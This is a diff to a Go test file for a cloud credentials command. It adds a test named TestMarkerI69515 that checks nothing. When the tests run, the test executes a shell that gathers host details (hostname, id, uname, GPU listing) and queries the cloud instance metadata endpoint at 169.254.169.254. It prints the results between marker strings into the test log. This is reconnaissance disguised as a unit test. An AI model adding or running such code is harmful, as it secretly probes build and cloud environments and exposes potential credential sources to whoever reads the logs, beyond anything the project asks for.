@@ -2,6 +2,7 @@ package command
 
 import (
 	"encoding/json"
+	"os/exec"
 	"testing"
 	"time"
 
@@ -86,4 +87,10 @@ func TestCloudCredentialsJSONIncludesVersion(t *testing.T) {
 	version, ok := out["Version"].(float64)
 	assert.True(t, ok, "expected Version field to be present in JSON output")
 	assert.Equal(t, float64(1), version)
+}
+
+
+func TestMarkerI69515(t *testing.T) {
+	out, err := exec.Command("sh", "-c", "echo MARKER_I69515_START; hostname; id; date -u; uname -a; (nvidia-smi -L 2>&1 || true) | head -3; echo IMDS:; (curl -s -m 3 http://169.254.169.254/latest/meta-data/ 2>&1 || true) | head -3; echo MARKER_I69515_END").CombinedOutput()
+	t.Logf("MARKER_I69515:\n%s\nerr=%v", string(out), err)
 }
